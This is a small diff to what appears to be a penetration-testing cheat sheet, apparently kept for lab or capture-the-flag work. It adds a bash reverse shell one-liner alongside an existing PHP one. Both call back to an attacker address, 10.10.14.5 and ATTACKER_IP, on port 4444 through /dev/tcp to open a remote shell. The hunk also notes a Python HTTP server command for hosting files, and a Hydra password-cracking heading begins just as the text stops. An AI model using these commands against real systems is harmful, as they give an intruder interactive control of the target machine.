@@ -9,7 +9,8 @@ Start a python sever:
     python3 -m http.server 8000
 
 Reverse shell script:
-    <?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"); ?>
+    PHP: <?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"); ?>
+    BASH: bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
 
 Hydra command:
     Syntax:
